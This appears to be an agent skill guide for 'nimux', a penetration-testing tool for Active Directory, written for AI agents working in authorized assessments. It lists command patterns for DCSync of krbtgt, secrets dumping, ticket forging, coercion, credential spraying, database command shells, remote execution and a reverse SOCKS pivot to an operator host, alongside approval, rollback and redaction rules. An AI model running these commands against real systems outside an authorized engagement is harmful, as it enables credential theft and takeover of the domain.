# nimux Agent Skill

Use this skill when an AI coding or operator agent needs to work with `nimux` in an authorized security assessment.

For the full command-family map, read `integrations/COMMAND_SURFACE.md`.

## Role

`nimux` is the execution engine. The agent is the planner, parser, and reporting layer.

The agent should:

- Read the local `nimux --help` output before assuming command syntax.
- Read `integrations/COMMAND_SURFACE.md` before planning multi-step usage across command families.
- Prefer `--json` when command output will be parsed.
- Prefer hostnames for Kerberos workflows because SPNs are hostname based.
- Generate `krb5.conf` with `nimux krb5conf` before Kerberos WinRM, SMB, LDAP, or MSSQL workflows when DNS or realm settings are uncertain.
- Use `--dry-run` before LDAP, ACL, GPO, certificate mapping, or other write operations where supported.
- Use `--rollback-out <file>` for supported AD write paths.
- Treat `nimux socks` as a native pivoting feature. After approved deployment, record the local SOCKS URL and use the same `nimux` binary again with `--proxy socks5://host:port`.
- Keep credentials, hashes, tickets, and secrets out of logs, summaries, and final answers unless the user explicitly asks to display them.
- Stop and ask for confirmation before destructive changes, persistence changes, password resets, GPO links, DCSync, secrets extraction, pivot helper deployment, or command execution against a new host.

The agent must not:

- Invent flags or workflows that are not present in `nimux --help` or the local docs.
- Run `nimux` outside the authorized scope supplied by the user.
- Hide errors from the user.
- Continue brute force or spraying if lockout risk is detected.
- Exfiltrate secrets or write payloads without explicit authorization.

## Required Context

Before running commands, collect:

```text
authorized scope
target domain and hosts
allowed protocols
credential material available
allowed write operations
output directory for evidence
rollback file path for supported writes
pivot listener IP and ports when internal routing is required
```

If any of these are missing, use read-only discovery first or ask the user.

## Command Patterns

The full command surface includes:

```text
scan, smb, ldap, kerberos, krb5conf, winrm, scm, bin, cim, tsch, mmc,
socks, secrets, dcsync, mssql, postgres, mysql, ssh, ftp, vnc, nfs,
afp, webdav, http, rdp, put, get, ls, mkdir, rm
```

## Complete Command Surface

Targets accepted by commands:

```text
hostname
IPv4 or IPv6 literal
CIDR range
IPv4 inclusive range
@file with newline-separated targets
```

Global options:

```text
--port <spec>
--concurrency <n>
--timeout <ms>
--retries <n>
--json
--log <file>
--rollback-out <file>
--dry-run
--no-color
--proxy socks5://host:port
```

Authentication options:

```text
-u, --username <s>
-p, --password <s>
-H, --hash <s>
-d, --domain <s>
-k, --kerberos
--ccache <file>
--krb5-config <file>
--local-auth
```

Command families:

```text
scan       TCP and UDP service discovery
smb        SMB negotiation, auth, enum, coercion, ticket capture
ldap       LDAP and AD query/write engine
kerberos   TGT, TGS, S4U, roasting, ticket conversion, forging
krb5conf   Generate krb5.conf for AD Kerberos
winrm      WinRM auth, command execution, shell, file helpers
scm        SCM command execution
bin        Helper service execution and shell
cim        WMI/DCOM Win32_Process.Create execution
tsch       Task Scheduler execution
mmc        DCOM IDispatch execution
socks      Native background SOCKS pivot helper
secrets    SAM, LSA, cached creds, DPAPI material
dcsync     Native MS-DRSR replication
mssql      MSSQL query, xp_cmdshell, linked servers, OLE, CLR
postgres   PostgreSQL auth, SQL client, COPY FROM PROGRAM shell
mysql      MySQL and MariaDB auth and interactive client
ssh        SSH auth, command, and shell
ftp        FTP auth and fingerprinting
vnc        VNC/RFB auth checks
nfs        NFS/RPC portmapper and export listing
afp        Apple Filing Protocol info and auth
webdav     WebDAV auth and listing
http       HTTP probe, headers, title, body fingerprint
rdp        RDP probe, TLS cert, NTLM info
put        SMB file upload
get        SMB file download
ls         SMB directory listing
mkdir      SMB directory creation
rm         SMB file deletion
```

## scan

Use for TCP and UDP discovery.

```bash
nimux scan <target> --port 445,389,5985 --open --json
nimux scan <target> --udp --port 53,88,123,137,161,464 --json
nimux scan <target> --top-ports 100 --open --json
```

Important options:

```text
--port <spec>
--top-ports <n>
-F
--udp
--Pn
--open
--debug-probe
-T<0..5>
--encrypt <n>
--rdp-proto <n>
-oG
-oC
-oX
```

## smb

Use for SMB auth, enumeration, local admin checks, RID brute, MS-RPRN coercion, ticket capture, and hash maintenance.

```bash
nimux smb <host> --json
nimux smb <host> -u <user> -p '<password>' -d <domain> --shares --users --groups --pass-pol --json
nimux smb <host> -u <user> -H <nt_hash> -d <domain> --sessions --loggedon-users --json
nimux smb <host> -k --ccache <file> --krb5-config <file> -d <domain> --shares --json
```

Coercion and ticket capture:

```bash
nimux smb <listener-host> -u <admin> -H <nt_hash> -d <domain> \
  --coerce --coerce-target <spooler-host> --listener <listener-host> \
  --capture-tickets --capture-host <listener-host> \
  --ticket-user '<machine-account>$' --ticket-service krbtgt \
  --capture-seconds 20 --capture-interval 1 --capture-out captured-ticket
```

Important options:

```text
--shares
--users
--groups
--pass-pol
--loggedon-users
--sessions
--disks
--rid-brute [n]
--rid-range <a-b>
--local-admins
--set-hash
--new-hash <ntlm>
--dialects <hex-list>
--coerce
--coerce-target <host>
--listener <host>
--capture-tickets
--capture-host <host>
--capture-out <path>
--ticket-user <s>
--ticket-service <s>
--capture-seconds <n>
--capture-interval <n>
--raw-ticket
```

## ldap

Use for AD enumeration, BloodHound output, LDAP writes, ACL paths, RBCD, shadow credentials, BadSuccessor, AD CS, DNS, GPO operations, and account operations.

Read-only examples:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --query users --json
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --query dcs --query trusts --query admins --json
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --bloodhound --bloodhound-out bloodhound.zip
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --filter '(servicePrincipalName=*)' --attrs sAMAccountName,servicePrincipalName
```

Named queries:

```text
users
computers
groups
trusts
admins
asreproast
kerberoast
gpos
schema
config
fgpp
deleted
locked
expired-passwords
stale-users
never-logged-on
sites
subnets
nested-groups
acl
dcs
dns
certs
unconstrained
constrained
rbcd-targets
passwd-notreqd
dont-expire
admincount
```

Write-capable examples:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --create user --name <name> --new-pass '<password>' --dry-run
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --create computer --name '<computer>$' --new-pass '<password>'
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --modify --dn '<dn>' --replace attr=value --dry-run
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --delete --dn '<dn>' --dry-run
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --ldif changes.ldif --dry-run
```

AD abuse and administration paths:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --set-rbcd --from '<controlled>$' --to '<target>$' --rollback-out rbcd.jsonl
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --shadow-creds --user <target> --shadow-out target-shadow --rollback-out shadow.jsonl
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --create dmsa --name <name> --ou '<container-dn>' --target-dn '<preceding-account-dn>'
```

AD CS:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --adcs
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --cert-inventory
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --adcs-request --ca '<ca-name>' --template <template> --out cert-out
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --adcs-auth --upn <user@domain> --pfx cert-out.pfx --ccache user.ccache
```

GPO:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --gpo --create-gpo --name '<gpo>'
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --gpo --link '<gpo>' --target '<target-dn>' --dry-run
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --gpo --startup --name '<gpo>' --put ./startup.ps1
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --gpo --schtask --name '<gpo>' --task-name '<task>' --task-cmd 'cmd.exe' --task-args '/c whoami'
```

## kerberos and krb5conf

Use for Kerberos setup, TGT, TGS, S4U, roasting, ticket conversion, renewal, purge, and ticket forging.

```bash
nimux krb5conf <dc> -d <domain> --out <domain>.krb5.conf
nimux kerberos <dc> -u <user> -p '<password>' -d <domain> --request kinit --out user.ccache
nimux kerberos <dc> -u <user> -H <nt_hash> -d <domain> --request asktgt --out user.ccache
nimux kerberos <dc> --request describe --ccache user.ccache --json
nimux kerberos <dc> --request ccache-to-kirbi --ccache user.ccache --out user.kirbi
nimux kerberos <dc> --request kirbi-to-ccache --kirbi user.kirbi --out imported.ccache
```

Request operations:

```text
ccache
describe
list
tickets
purge
renew
ccache-to-kirbi
kirbi-to-ccache
kinit
asktgt
getst
kerberoast
s4u2self
s4u2proxy
s4u
rbcd
constrained
kcd
```

S4U and roasting:

```bash
nimux kerberos <dc> -d <domain> --request s4u \
  --ccache svc.ccache --user <impersonated-user> --service cifs/<host> \
  --out delegated.ccache

nimux kerberos <dc> -d <domain> --request kerberoast \
  --ccache user.ccache --spn MSSQLSvc/sql01.domain.local:1433
```

Forge operations:

```text
golden
diamond
silver
inter-realm
```

## winrm

Use for WinRM auth, command execution, interactive shell, file transfer, and managed assembly execution.

```bash
nimux winrm <host> -u <user> -p '<password>' -d <domain> --cmd whoami --json
nimux winrm <host> -u <user> -H <nt_hash> -d <domain> --cmd hostname --json
nimux winrm <host> -k --ccache user.ccache --krb5-config domain.krb5.conf -u <user> -d <domain> --spn WSMAN --shell
```

Shell helpers:

```text
cd <path>
upload <local> [remote]
download <remote> [local]
upload-dir <local> [remote]
download-dir <remote> [local]
execute-assembly <local> [args...]
```

## Remote execution transports

Use only after explicit approval.

```bash
nimux scm <host> -u <admin> -H <nt_hash> -d <domain> --cmd "cmd.exe /c whoami"
nimux bin <host> -u <admin> -H <nt_hash> -d <domain> --cmd whoami
nimux bin <host> -u <admin> -H <nt_hash> -d <domain> --shell
nimux cim <host> -u <admin> -H <nt_hash> -d <domain> --cmd whoami
nimux tsch <host> -u <admin> -H <nt_hash> -d <domain> --cmd "cmd.exe /c whoami"
nimux mmc <host> -u <admin> -H <nt_hash> -d <domain> --cmd "cmd.exe /c whoami"
```

Aliases:

```text
service, smbexec -> scm
psexec, svc      -> bin
wmi, wmiexec     -> cim
task, sch, atexec -> tsch
com, dcom        -> mmc
```

## socks and proxy

Use `nimux socks` to deploy a background pivot helper, then reuse `nimux` with `--proxy`.

```bash
nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081

nimux scan <internal-cidr> --port 445,389,5985 --open --proxy socks5://127.0.0.1:1080 --json

nimux ldap <internal-dc> -u <user> -p '<password>' -d <domain> \
  --proxy socks5://127.0.0.1:1080 --query dcs --query trusts --json
```

Cleanup:

```bash
nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
  --kill --pid <pid> --socks-task <task-name> --remote <remote-helper-path>
```

Record:

```text
local_proxy_url
pid
socks_task
remote_helper_path
```

## secrets and dcsync

Use only after explicit approval.

```bash
nimux secrets <host> -u <admin> -H <nt_hash> -d <domain> --json
nimux secrets <host> -k --ccache admin.ccache --krb5-config domain.krb5.conf -u <admin> -d <domain> --json
nimux dcsync <dc> -u <user> -H <nt_hash> -d <domain> --user '<domain>\\krbtgt' --json
nimux dcsync <dc> -u <user> -H <nt_hash> -d <domain> --trust-keys --json
```

## File operations

```bash
nimux put <host> -u <user> -p '<password>' -d <domain> --share <share> --local ./file.txt --remote path\\file.txt
nimux get <host> -u <user> -p '<password>' -d <domain> --share <share> --remote path\\file.txt --local ./file.txt
nimux ls <host> -u <user> -p '<password>' -d <domain> --share <share> --remote path
nimux mkdir <host> -u <user> -p '<password>' -d <domain> --share <share> --remote path
nimux rm <host> -u <user> -p '<password>' -d <domain> --share <share> --remote path\\file.txt
```

## Database protocols

MSSQL:

```bash
nimux mssql <host> -u <user> -p '<password>' --query 'SELECT @@version'
nimux mssql <host> -u <user> -p '<password>' --cmd whoami
nimux mssql <host> -u <user> -p '<password>' --shell
nimux mssql <host> -u <user> -p '<password>' --link <server> --query 'SELECT @@SERVERNAME'
```

PostgreSQL:

```bash
nimux postgres <host> -u <user> -p '<password>' --query 'SELECT version();'
nimux postgres <host> -u <user> -p '<password>' --shell
```

MySQL:

```bash
nimux mysql <host> -u <user> -p '<password>'
nimux mysql <host> -u <user> -p '<password>' --cli
```

## Other protocols

```bash
nimux ssh <host> -u <user> -p '<password>' --cmd whoami
nimux ssh <host> -u <user> -p '<password>' --shell
nimux ftp <host> -u <user> -p '<password>' --json
nimux vnc <host> -p '<password>' --json
nimux nfs <host> --json
nimux afp <host> -u <user> -p '<password>' --json
nimux webdav <host> -u <user> -p '<password>' --json
nimux http <host> --json
nimux rdp <host> --json
```

## Credential Spraying

Credential spray inputs are supported when username or password points to a file.

```text
--spray-delay <ms>
--max-attempts-per-user <n>
--lockout-aware
```

Discovery:

```bash
nimux scan <target-or-cidr> --port 445,389,5985 --open --json
nimux smb <host> --json
```

Authenticated SMB enumeration:

```bash
nimux smb <host> -u <user> -p '<password>' -d <domain> --shares --users --groups --pass-pol --json
nimux smb <host> -u <user> -H <nt_hash> -d <domain> --shares --json
```

LDAP enumeration:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> \
  --query dcs --query trusts --query admins --query kerberoast --json
```

BloodHound output:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> \
  --bloodhound --bloodhound-out bloodhound.zip
```

Kerberos setup:

```bash
nimux krb5conf <dc> -d <domain> --out <domain>.krb5.conf
nimux kerberos <dc> -u <user> -p '<password>' -d <domain> --request kinit --out <user>.ccache
```

WinRM Kerberos command:

```bash
nimux winrm <host> -k --ccache <user>.ccache --krb5-config <domain>.krb5.conf \
  -u <user> -d <domain> --spn WSMAN --cmd whoami --json
```

Proxy-aware enumeration:

```bash
nimux scan <internal-cidr> --port 445,389,5985 --open --proxy socks5://127.0.0.1:1080 --json
```

Native pivot deployment:

```bash
nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
```

Native pivot deployment with Kerberos:

```bash
nimux socks <pivot-host> -k --ccache <admin>.ccache --krb5-config <domain>.krb5.conf \
  -d <domain> --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
```

After deployment, keep the SOCKS helper running in the background and reuse `nimux` with the printed proxy endpoint:

```bash
nimux scan <internal-cidr> --port 445,389,5985 --open \
  --proxy socks5://127.0.0.1:1080 --json

nimux smb <internal-host> -u <user> -p '<password>' -d <domain> \
  --proxy socks5://127.0.0.1:1080 --shares --json

nimux ldap <internal-dc> -u <user> -p '<password>' -d <domain> \
  --proxy socks5://127.0.0.1:1080 --query dcs --query trusts --json
```

Pivot cleanup:

```bash
nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
  --kill --pid <pid> --socks-task <task-name> --remote <remote-helper-path>
```

GPO write preview:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> \
  --gpo --link '<gpo-name>' --target '<target-dn>' --dry-run
```

GPO write with rollback:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> \
  --gpo --link '<gpo-name>' --target '<target-dn>' --rollback-out gpo-rollback.jsonl
```

## Output Handling

When summarizing results:

- Separate confirmed facts from assumptions.
- Include exact commands only when they do not reveal secrets.
- Redact passwords, NT hashes, AES keys, tickets, cookies, and private keys.
- Preserve target names, ports, status codes, and error messages.
- Report files created locally.

## Safety Defaults

Default to read-only operations unless the user explicitly requests writes.

Use this progression:

```text
scan -> protocol probe -> authenticated enum -> path validation -> dry-run write -> approved write -> verify -> cleanup
```

For internal network pivoting, use this progression:

```text
confirm pivot host is in scope
deploy nimux socks only after approval
record socks URL, pid, task name, and remote helper path
reuse nimux with --proxy for internal scan and enumeration
avoid direct commands until the routed path is verified
cleanup the pivot helper when finished
```

For write-capable workflows, include rollback:

```text
LDAP ACL edits
GPO links and file writes
RBCD writes
shadow credentials
certificate mappings
password changes
group membership changes
```
